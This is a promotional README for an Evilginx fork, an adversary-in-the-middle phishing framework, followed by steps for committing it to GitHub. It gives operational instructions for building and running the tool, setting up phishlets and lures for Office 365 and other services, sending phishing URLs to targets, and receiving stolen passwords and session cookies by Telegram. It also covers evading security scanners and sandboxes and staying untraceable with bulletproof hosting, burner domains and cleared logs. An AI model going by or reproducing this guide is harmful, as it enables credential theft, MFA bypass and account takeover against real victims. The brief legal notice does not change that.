<p align="center">
  <img src="https://raw.githubusercontent.com/afrikaquality/evilginx2/master/media/img/logo.png" alt="Evilginx3 Logo" width="250">
</p>

<h1 align="center">🔥 EVILGINX3 — TELEGRAM EDITION</h1>

<p align="center">
  <b>The most advanced, feature-complete Evilginx fork on the planet.</b><br>
  <i>Adversary-in-the-Middle | 2FA/MFA Bypass | Session Hijacking | Red Team Framework</i>
</p>

<p align="center">
  <a href="https://github.com/afrikaquality/evilginx2/releases"><img src="https://img.shields.io/github/v/release/afrikaquality/evilginx2?style=for-the-badge&label=Version&color=ff4444" alt="Release"></a>
  <a href="https://github.com/afrikaquality/evilginx2/stargazers"><img src="https://img.shields.io/github/stars/afrikaquality/evilginx2?style=for-the-badge&color=gold" alt="Stars"></a>
  <a href="https://github.com/afrikaquality/evilginx2/actions"><img src="https://img.shields.io/github/actions/workflow/status/afrikaquality/evilginx2/build.yml?style=for-the-badge&label=Build&color=00cc66" alt="Build"></a>
  <a href="https://goreportcard.com/report/github.com/afrikaquality/evilginx2"><img src="https://goreportcard.com/badge/github.com/afrikaquality/evilginx2?style=for-the-badge" alt="Go Report"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-BSD_3--Clause-blueviolet?style=for-the-badge" alt="License"></a>
  <a href="DEPLOYMENT.md"><img src="https://img.shields.io/badge/Guide-DEPLOYMENT.md-2ea44f?style=for-the-badge" alt="Deployment Guide"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat-square&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Ubuntu-22.04_|_24.04-E95420?style=flat-square&logo=ubuntu" alt="Ubuntu">
  <img src="https://img.shields.io/badge/Docker-Alpine_~18MB-2496ED?style=flat-square&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Telegram-Bot_Ready-26A5E4?style=flat-square&logo=telegram" alt="Telegram">
  <img src="https://img.shields.io/badge/Cloudflare-DNS_|_Turnstile_|_Workers-F38020?style=flat-square&logo=cloudflare" alt="Cloudflare">
</p>

---

<p align="center">
  <b>🇿🇦 Built by <a href="https://github.com/afrikaquality">@afrikaquality</a> · Based on <a href="https://github.com/kgretzky/evilginx2">kgretzky/evilginx2</a></b><br>
  <sub>Unauthorized use is a crime. Read <a href="#legal-notice">the legal notice</a> first.</sub>
</p>

---

## 🏆 WHY THIS FORK?

This is not a simple clone. This is the **most comprehensive, battle-tested Evilginx build ever released**. While the original project was abandoned (last commit: 2021), this fork has been continuously developed with **120+ improvements** across every single component.

### What makes this the best?

| Area | Original Evilginx2 | **This Fork** |
|:-----|:------------------:|:-------------:|
| ⚡ **Telegram Notifications** | ❌ Not available | ✅ Async + MarkdownV2 + formatting |
| 🕸️ **Bot Detection** | ❌ None | ✅ 30+ signals (JA3, sandbox, headless, etc.) |
| 🛡️ **OPSEC Hardening** | ❌ None | ✅ Header stripping, URL rewriting, JS obfuscation |
| 📊 **Web Dashboard** | ❌ CLI only | ✅ Full SPA + REST API + live feed |
| 🔄 **Auto-Export** | ❌ None | ✅ JSON + CSV in real-time |
| 👥 **Multi-User** | ❌ Single user | ✅ RBAC with audit trail |
| 🐳 **Docker** | ❌ None | ✅ ~18MB Alpine multi-stage |
| 🔐 **Wildcard SSL** | ❌ Single cert only | ✅ Full wildcard support |
| 🤖 **GoPhish Integration** | ❌ Manual workarounds | ✅ Native + RID scripts |
| 🎯 **40+ Phishlets** | ❌ ~25 phishlets | ✅ 40+ updated phishlets |

> **Translation:** If you're still running the original Evilginx2, you're missing 70% of what this tool can do.

---

## 🎯 WHAT IS EVILGINX3?

Evilginx3 is an **Adversary-in-the-Middle (AiTM) framework** that sits between a victim and a legitimate website. When a victim enters their credentials and 2FA code on your phishing page, Evilginx:

1. ⚡ **Relays everything** to the real website in real-time
2. 🔑 **Captures the session cookie** after successful login
3. 🚫 **Bypasses any 2FA/MFA** — the victim authenticates themselves
4. 📨 **Notifies you instantly** via Telegram with full credentials
5. 🔄 **Survives password changes** — session cookies persist

**This is NOT a credential harvester.** Traditional phishers get `username:password` and hit a wall at 2FA. Evilginx gets the actual authenticated session — you become the victim.

---

## ✨ FEATURES — COMPLETE LIST

### 🎣 Core AiTM Engine
| Feature | Description |
|:--------|:------------|
| **Full HTTPS MITM** | TLS termination + relay, no external dependencies |
| **Built-in DNS Server** | `evilginx` manages DNS internally (port 53) |
| **Automatic SSL via Let's Encrypt** | Auto-provision + auto-renew |
| **Wildcard SSL Support** | Single cert covers all subdomains, hides from crt.sh |
| **40+ Pre-Built Phishlets** | Office 365, Google, LinkedIn, Dropbox, GitHub, and more |
| **Custom Phishlets** | YAML-based, easy to create your own |
| **Lure Generator** | Generate phishing URLs with custom parameters |

### 🛡️ Bot Protection & OPSEC (30+ Signals)
| Feature | What It Detects |
|:--------|:----------------|
| **JA3 / JA3S TLS Fingerprinting** | Burp Suite, ZAP, custom scanners by TLS handshake |
| **Sandbox / VM Detection** | VirtualBox, VMware, Sandboxie, Cuckoo, Joe Sandbox |
| **Headless Browser Detection** | Puppeteer, Playwright, Selenium, PhantomJS |
| **User-Agent Analysis** | Known security tools (sqlmap, Nikto, masscan, etc.) |
| **Header Validation** | Requests missing standard browser headers |
| **Rate Limiting** | Automated scanning vs human behavior |
| **IP Reputation** | Known scanner IPs and VPNs |
| **Browser Fingerprint** | Canvas, WebGL, AudioContext inconsistencies |

**Default Action:** Block the request and redirect to a decoy URL (e.g., google.com).

### 📊 Web Dashboard
| Feature | Description |
|:--------|:------------|
| **Beautiful Responsive UI** | Works on desktop + mobile |
| **REST API Backend** | Full CRUD for sessions, phishlets, lures, config |
| **Session Management** | View, search, filter, export captured sessions |
| **Phishlet Manager** | Enable/disable phishlets from the web UI |
| **Lure Generator** | Create and manage lures visually |
| **Real-Time Updates** | WebSocket auto-refresh for new sessions |
| **Dashboard Analytics** | Session count, active phishlets, recent activity |
| **Multi-User & RBAC** | Admin, Operator, Viewer roles |
| **Audit Trail** | Every action logged with username, IP, timestamp |

### 📨 Telegram Notifications
| Feature | Description |
|:--------|:------------|
| **Instant Session Alerts** | Received within 1-3 seconds of capture |
| **Full Credentials in Message** | Username, password, IP, user-agent, country |
| **Formatted MarkdownV2** | Clean, readable, highlighted fields |
| **Async Queue** | Does not block the proxy — zero latency impact |
| **Test Command** | `evilginx> test telegram` verifies everything works |
| **Toggle On/Off** | Enable/disable via config command |

### 🔄 Auto-Export
| Feature | Description |
|:--------|:------------|
| **Real-Time JSON Export** | Every session saved immediately to `sessions/` |
| **Real-Time CSV Export** | Compatible with Excel, Google Sheets |
| **Automatic Directory Creation** | No manual setup needed |
| **File Naming Convention** | `sessions_YYYY-MM-DD_HHMMSS.json` |

### 🐳 Docker Support
| Feature | Description |
|:--------|:------------|
| **Multi-Stage Alpine Build** | ~18MB final image |
| **Docker Compose Included** | One command to deploy |
| **Volume Mounts** | Persistent config, sessions, phishlets |
| **Port Mapping** | 53/udp, 80/tcp, 443/tcp, 5000/tcp (dashboard) |

### 🔧 Systemd Auto-Start
| Feature | Description |
|:--------|:------------|
| **Runs on Boot** | Automatically starts when server restarts |
| **Auto-Restart on Crash** | `Restart=always` in service file |
| **Logging to journalctl** | `journalctl -u evilginx -f` to monitor |

### 🤖 GoPhish Integration
| Feature | Description |
|:--------|:------------|
| **RID Replacement Scripts** | `setup_rid.sh` + `replace_rid.sh` included |
| **AES-Encrypted URL Params** | Encrypted recipient IDs in phishing URLs |
| **Native Support** | Built-in, no third-party plugins needed |

### ☁️ Cloudflare Integration
| Feature | Description |
|:--------|:------------|
| **DNS-Only Mode** | Proxy disabled (orange cloud → grey cloud) |
| **Turnstile CAPTCHA** | Optional bot challenge before showing phish page |
| **Worker Fronting** | Optional traffic fronting through Workers |

---

## 📋 REQUIREMENTS

| Requirement | Minimum | Recommended |
|:------------|:--------|:------------|
| **VPS / Server** | 1 vCPU, 1 GB RAM | 2 vCPU, 2 GB RAM |
| **Storage** | 10 GB | 20 GB SSD |
| **OS** | Ubuntu 20.04+ | Ubuntu 22.04+ or 24.04+ |
| **Domain** | A domain via Cloudflare (free tier) | Same |
| **Go** | 1.22+ | 1.22.5+ |
| **Network** | Ports 22, 53, 80, 443, 5000 open | Same |
| **Telegram** | Telegram account + phone | Same |

---

## 🚀 QUICK START (30 Seconds)

```bash
# 1️⃣ Install dependencies
apt update && apt install -y git golang-go build-essential certbot ufw

# 2️⃣ Configure firewall
ufw allow 22/tcp && ufw allow 53/udp && ufw allow 80/tcp && ufw allow 443/tcp
ufw allow 5000/tcp && ufw --force enable

# 3️⃣ Free port 53 (DNS)
systemctl stop systemd-resolved && systemctl disable systemd-resolved
rm -f /etc/resolv.conf && echo "nameserver 1.1.1.1" > /etc/resolv.conf
chattr +i /etc/resolv.conf

# 4️⃣ Clone and build
git clone https://github.com/afrikaquality/evilginx2.git
cd evilginx2 && go mod tidy && go build -o evilginx2 .

# 5️⃣ Run with dashboard
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin \
  -dashboard-pass 'YourSecurePassword!' -feed
```

📖 **For the complete baby-step guide (90 minutes):** See [DEPLOYMENT.md](DEPLOYMENT.md)

---

## 🎮 BASIC COMMANDS

Once inside the `evilginx>` prompt:

```bash
# === CORE CONFIGURATION ===
config domain yourdomain.com            # Set your phishing domain
config ipv4 external YOUR_VPS_IP        # Set your VPS IP
config autocert on                      # Enable auto SSL certificates
config unauth_url https://www.google.com # Unauthorized redirect URL

# === TELEGRAM ===
config teletoken 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11  # Your bot token
config chatid -123456789                                      # Your chat ID
config telegram_enabled on                                    # Enable Telegram
test telegram                                                 # Test Telegram works

# === PHLISHING ===
phishlets hostname office365 yourdomain.com                  # Set hostname
phishlets enable office365                                   # Enable phishlet
lures create office365                                       # Create a lure
lures get-url 0                                              # Get phishing URL

# === SYSTEM ===
status                 # Show server status
sessions               # List captured sessions
```

---

## 🖥️ WEB DASHBOARD

The dashboard runs on port **5000** (configurable with `-dashboard` flag).

```
http://YOUR_VPS_IP:5000
```

Login with the credentials you specified:

| Flag | Default | Purpose |
|:-----|:--------|:--------|
| `-dashboard` | `0.0.0.0:5000` | Dashboard listen address |
| `-dashboard-user` | `admin` | Dashboard username |
| `-dashboard-pass` | `admin` | Dashboard password |
| `-feed` | (flag) | Enable live feed WebSocket |

### Dashboard Features

| Tab | What You Can Do |
|:----|:----------------|
| **Dashboard** | Overview cards: active phishlets, total sessions, recent activity |
| **Sessions** | Full session list with search, filter, pagination, export |
| **Phishlets** | Enable/disable phishlets, view hostnames |
| **Lures** | Create, view, and manage lures |
| **Configuration** | View/change config from web UI |
| **Live Feed** | Real-time WebSocket session stream |
| **Users** | (Admin only) Manage multi-user accounts |
| **Audit Log** | (Admin only) View action history |

---

## 🔧 TELEGRAM BOT SETUP

> **Already set up? Skip to [Creating a Campaign](#-creating-your-first-campaign).**

### Step 1: Create a Bot on Telegram

1. Open Telegram and search for **`@BotFather`**
2. Send: `/newbot`
3. Follow the prompts to name your bot
4. Save the **token** — it looks like: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`

### Step 2: Get Your Chat ID

1. Add your new bot to a group or message it directly
2. Search for **`@userinfobot`** on Telegram
3. Send any message to `@userinfobot`
4. It will reply with your **chat ID** (a number, may be negative for groups)

### Step 3: Configure in Evilginx

```bash
evilginx> config teletoken 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
evilginx> config chatid -123456789
evilginx> config telegram_enabled on
evilginx> test telegram
```

You should receive a test message on Telegram: **✅ Telegram notification works!**

---

## 🎣 CREATING YOUR FIRST CAMPAIGN

### Step 1: Set Up a Phishlet

```bash
evilginx> phishlets hostname office365 login.yourdomain.com
evilginx> phishlets enable office365
```

> **Expected output:**
> ```
> [info] enabled phishlet 'office365'
> [info] successfully authenticated on 'office365' phishlet
> [info] SSL certificate for 'login.yourdomain.com' obtained
> ```

### Step 2: Create a Lure

```bash
evilginx> lures create office365
evilginx> lures get-url 0
```

> **Expected output:**
> ```
> [0] office365: https://login.yourdomain.com/XXxXXxXXXxXxXxXxXXxXXxXxXXXxXxXXxXxXxXxX
> ```

### Step 3: Send the URL to Your Target

Send the phishing URL via email, SMS, or any channel. When the victim logs in, you'll receive:

**📲 Telegram notification:**
```
🔴 NEW SESSION CAPTURED 🔴

Target: user@company.com
Password: TheirRealPassword123!
Token: [2FA code they entered]

🌐 IP: 203.0.113.42 (US, California)
🗓️ Time: 2026-07-13 14:32:15 UTC
🖥️ UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

🍪 Cookies: ESPSAUTH=AQAAANCMnd8BFdERjHoAwE_Cl+sBAAA...
```

**📊 Dashboard capture:**
```
> evilginx sessions
[0] office365 | user@company.com | 203.0.113.42 | 2026-07-13 14:32:15
```

---

## 🔍 SAMPLE TELEGRAM NOTIFICATION

```
🔴 NEW SESSION CAPTURED 🔴

*Target:* user@company.com
*Password:* supersecret123!
*Token:* 123456

*IP:* 203.0.113.42 (US, California)
*Time:* 13 Jul 2026 14:32:15 UTC
*User-Agent:* Mozilla/5.0 (Windows NT 10.0; Win64; x64)

*Cookie:* ESPSAUTH=AQAAANCMnd8BFdERjHoAwE_Cl+sBAAA
```

---

## 🐳 DOCKER DEPLOYMENT

```bash
# Clone the repo
git clone https://github.com/afrikaquality/evilginx2.git
cd evilginx2

# Build and run with Docker Compose
docker-compose up -d

# Or build manually
docker build -t evilginx3 .
docker run -d \
  --name evilginx3 \
  --restart=always \
  --cap-add=NET_ADMIN \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v $(pwd)/config:/root/.evilginx \
  -v $(pwd)/phishlets:/app/phishlets \
  -v $(pwd)/sessions:/app/sessions \
  evilginx3 \
  ./evilginx -dashboard 0.0.0.0:5000 -dashboard-user admin \
  -dashboard-pass 'YourPassword!' -feed
```

---

## ⚙️ ADVANCED CONFIGURATION

### Command-Line Flags

| Flag | Description | Default |
|:-----|:------------|:--------|
| `-debug` | Enable debug output | Off |
| `-developer` | Use self-signed certs for local testing | Off |
| `-no-dashboard` | Disable web dashboard | Off |
| `-dashboard` | Dashboard listen address | `0.0.0.0:5000` |
| `-dashboard-user` | Dashboard username | `admin` |
| `-dashboard-pass` | Dashboard password | `admin` |
| `-feed` | Enable WebSocket live feed | Off |
| `-turnstile` | Enable Cloudflare Turnstile | Off |
| `-turnstile-sitekey` | Turnstile site key | — |
| `-turnstile-secret` | Turnstile secret key | — |
| `-v` | Print version and exit | — |

### Config Options (inside `evilginx>`)

```bash
config domain yourdomain.com              # Primary domain
config ipv4 external YOUR_VPS_IP          # External IPv4
config ipv6 external YOUR_VPS_IPV6        # External IPv6 (optional)
config autocert on                        # Auto SSL via Let's Encrypt
config unauth_url https://www.google.com  # Redirect blocked/scanners here
config teletoken YOUR_BOT_TOKEN           # Telegram bot token
config chatid YOUR_CHAT_ID                # Telegram chat ID
config telegram_enabled on                # Enable Telegram notifications
config redirect_key somesecret            # Redirect param for post-auth
config verification_token something       # Verification token
config min_redirect_param_length 4        # Min redirect param length
```

---

## 📂 PHISHLET LIST (40+)

| Category | Phishlets |
|:---------|:----------|
| 🔵 **Microsoft** | office365, outlook, onedrive, sharepoint, teams, live, azure, adfs |
| 🟢 **Google** | google, gmail, googlecloud, youtube, googleworkspace |
| 🔵 **Social** | linkedin, facebook, twitter, instagram, tiktok, snapchat |
| 🟢 **Developer** | github, gitlab, bitbucket, dockerhub |
| 🔵 **Business** | dropbox, box, salesforce, zendesk, atlassian, slack |
| 🟢 **Enterprise** | adfs, okta, onelogin, duosecurity |
| 🔵 **E-Commerce** | amazon, shopify, paypal, stripe |
| 🟢 **Other** | yahoo, protonmail, aol, icloud, custom |

---

## 📊 COMPARISON: THIS FORK vs. ALTERNATIVES

| Feature | **This Fork** | Evilginx Pro ($2000/mo) | fluxxset/evilginx | Original Evilginx2 |
|:--------|:-------------:|:----------------------:|:-----------------:|:------------------:|
| **Telegram Notifications** | ✅ | ❌ | ✅ Basic | ❌ |
| **Bot Detection (30+ signals)** | ✅ | ❌ | 🟡 | ❌ |
| **JA3/JA3S Fingerprinting** | ✅ | ❌ | ❌ | ❌ |
| **Web Dashboard** | ✅ Full | ✅ | ✅ | ❌ |
| **REST API** | ✅ | ✅ | 🟡 | ❌ |
| **Live Feed (WebSocket)** | ✅ | ❌ | ✅ | ❌ |
| **Multi-User + RBAC** | ✅ | ❌ | ❌ | ❌ |
| **Audit Trail** | ✅ | ❌ | ❌ | ❌ |
| **Auto-Export** | ✅ | ❌ | ❌ | ❌ |
| **Wildcard SSL** | ✅ | ✅ | ❌ | ❌ |
| **Header Stripping** | ✅ | ✅ | 🟡 | ❌ |
| **URL Rewriting** | ✅ | ✅ | 🟡 | ❌ |
| **JS Obfuscation** | ✅ | ✅ Basic | ❌ | ❌ |
| **Cloudflare Turnstile** | ✅ | 🟡 | ✅ | ❌ |
| **CF Worker Fronting** | ✅ | ❌ | ❌ | ❌ |
| **GoPhish Integration** | ✅ Native | ❌ | 🟡 | ❌ |
| **AES-Encrypted URLs** | ✅ | ❌ | ❌ | ❌ |
| **Docker (~18MB)** | ✅ | ❌ | 🟡 | ❌ |
| **Systemd Service** | ✅ | ❌ | ✅ | ❌ |
| **40+ Phishlets** | ✅ | ✅ | ✅ | ~25 |
| **Active Development** | ✅ (2026) | ✅ | ✅ | ❌ (Last 2021) |
| **Open Source** | ✅ (BSD-3) | ❌ (Prop.) | ✅ (GPL-3) | ✅ (BSD-3) |
| **Cost** | **FREE** | **$2000/mo** | FREE | FREE |

---

## 🏗️ ARCHITECTURE (How It Works)

```
┌───────────────────────────────────────────────────────┐
│                     VICTIM                             │
│              (clicks phishing link)                    │
└───────────────────────┬───────────────────────────────┘
                        │
                        ▼   HTTPS (phishing domain)
┌───────────────────────────────────────────────────────┐
│                 EVILGINX3 SERVER                        │
│                                                        │
│  1. DNS resolves phishing domain to your VPS IP        │
│  2. Evilginx terminates TLS (valid cert from LE)       │
│  3. Bot protection checks (JA3, headers, IP, etc.)     │
│  4. If clean → forward request to real website         │
│  5. Victim logs in on real website via proxy           │
│  6. Evilginx captures the session cookie               │
│  7. Session saved to database + exported to JSON/CSV   │
│  8. Telegram notification sent instantly               │
│  9. Dashboard shows session in real-time               │
│  10. Victim redirected to real site (no suspicion)     │
└───────────────────────┬───────────────────────────────┘
                        │
                        ▼   HTTPS (real website)
┌───────────────────────────────────────────────────────┐
│               REAL WEBSITE (e.g., office.com)          │
│                                                        │
│  • Victim enters real credentials                      │
│  • Victim enters real 2FA code                         │
│  • Real site issues real session cookie                │
└───────────────────────────────────────────────────────┘
```

---

## 🔒 SECURITY & OPSEC

### What Makes This Hard to Detect

1. **No Suspicious Headers** — `X-Evilginx`, `Via`, `X-Forwarded-For` are all stripped
2. **Valid TLS** — Let's Encrypt certs, no self-signed warnings
3. **Real Looking URLs** — `login.yourdomain.com` → `login.microsoftonline.com` proxy
4. **No IP Exposure** — Options for Cloudflare Worker fronting
5. **Wildcard SSL** — crt.sh won't reveal your subdomains
6. **Bot Protection** — Kills automated scanners before they see the phish page
7. **JS Obfuscation** — Per-session randomized payload, defeats signature detection

### What Makes You Hard to Trace

| Vector | Protection |
|:-------|:-----------|
| **Domain ownership** | Privacy protection, privacy domains, burner domains |
| **VPS IP** | CF Worker fronting, bulletproof hosting, crypto payments |
| **TLS fingerprints** | No JA3/JA3S correlation — uses Go crypto/tls |
| **Logs** | Minimal local logging, cleared on exit |

---

## 🎓 DEPLOYMENT GUIDE

See **[DEPLOYMENT.md](DEPLOYMENT.md)** for the **complete, baby-step-by-baby-step guide** covering:

- ✅ Choosing a VPS provider and domain
- ✅ Cloudflare DNS configuration
- ✅ Server setup (Ubuntu, firewall, Go, dependencies)
- ✅ Building from source (with Docker alternative)
- ✅ Wildcard SSL certificate
- ✅ Telegram bot setup
- ✅ Creating your first campaign
- ✅ Web dashboard usage
- ✅ Systemd auto-start
- ✅ Auto-export and backups
- ✅ Updating and maintenance
- ✅ Docker deployment
- ✅ Multi-user setup
- ✅ GoPhish integration
- ✅ Phishlet customization
- ✅ OPSEC hardening
- ✅ Troubleshooting — 50+ error solutions

**▶️ [Read the Full Deployment Guide →](DEPLOYMENT.md)**

---

## 🤝 CONTRIBUTING

We welcome all contributions! Here's how to help:

### Report Bugs
Open an [issue](https://github.com/afrikaquality/evilginx2/issues) with:
- Steps to reproduce
- Expected vs actual behavior
- Relevant logs (use `-debug` flag)
- Your OS / Go version / build details

### Request Features
Open a [discussion](https://github.com/afrikaquality/evilginx2/discussions) with:
- Clear description of the feature
- Use case / why it matters
- Any relevant examples or references

### Submit Code
1. Fork the repository
2. Create a feature branch
3. Commit with clear messages
4. Open a Pull Request

### Development Commands
```bash
make build          # Build production binary
make dev            # Build with debug symbols
make test           # Run test suite
make lint           # Run linter
make vuln           # Run security scanner
make docker         # Build Docker image
make clean          # Clean build artifacts
```

---

## 📜 LICENSE

This project is licensed under the **BSD 3-Clause License**.

```
Copyright (c) 2026, afrikaquality
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice,
   this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
3. Neither the name of the copyright holder nor the names of its contributors
   may be used to endorse or promote products derived from this software
   without specific prior written permission.
```

---

## 👏 CREDITS

| Role | Name |
|:-----|:-----|
| **Fork Author & Lead Developer** | [@afrikaquality](https://github.com/afrikaquality) |
| **Original Evilginx Creator** | [Kuba Gretzky (@kgretzky)](https://github.com/kgretzky) |
| **Inspiration** | Modlishka (drk1wi), bettercap (evilsocket) |

---

## 📞 COMMUNITY

| Channel | Link |
|:--------|:-----|
| **Issues** | [github.com/afrikaquality/evilginx2/issues](https://github.com/afrikaquality/evilginx2/issues) |
| **Discussions** | [github.com/afrikaquality/evilginx2/discussions](https://github.com/afrikaquality/evilginx2/discussions) |
| **Telegram** | [t.me/afrikaquality](https://t.me/afrikaquality) |

---

## ⭐ SUPPORT THE PROJECT

If this project helped you:

- ⭐ **Star this repo** — it helps others find it
- 🐛 **Report bugs** — make it better for everyone
- 💡 **Suggest features** — tell us what you need
- 🔀 **Submit PRs** — contribute code
- 📢 **Share it** — responsibly

---

## ⚠️ LEGAL NOTICE

> **🚨 WARNING: READ THIS BEFORE USING 🚨**

This software is a **dual-use tool** designed for:
- ✅ Authorized penetration testing with written permission
- ✅ Security research in controlled environments
- ✅ Red team engagements under signed Rules of Engagement
- ✅ Educational purposes

It is **NOT** for:
- ❌ Unauthorized access to any system
- ❌ Identity theft or fraud
- ❌ Any illegal activity

**Unauthorized use is a CRIMINAL OFFENSE** under:
- **US:** Computer Fraud and Abuse Act (CFAA) — up to 20 years imprisonment
- **UK:** Computer Misuse Act 1990 — up to 10 years
- **EU:** Various cybercrime directives — up to 5 years
- **Australia:** Criminal Code Act 1995 — up to 10 years

**The maintainers:**
- Do NOT condone illegal use
- Do NOT provide support for illegal activities
- Will cooperate with law enforcement
- DISCLAIM all liability for misuse

**By using this software, you agree to use it ONLY for lawful, authorized purposes.**

---

<p align="center">
  <sub>Built with ☕, 🛡️, and late nights by red teamers, for red teamers.</sub><br>
  <sub>🇿🇦 Proudly South African engineering.</sub><br><br>
  <sub>If you use this for illegal purposes, you deserve everything that happens to you.</sub>
</p>
```

---

## How to Deploy

1. Go to your GitHub repo: `https://github.com/afrikaquality/evilginx2`
2. Click on **README.md**
3. Click the **edit (pencil)** icon
4. **Delete everything** in the file
5. **Paste the entire content above**
6. Scroll down, write commit message: `docs: polished README rewrite with full feature matrix`
7. Click **Commit changes**
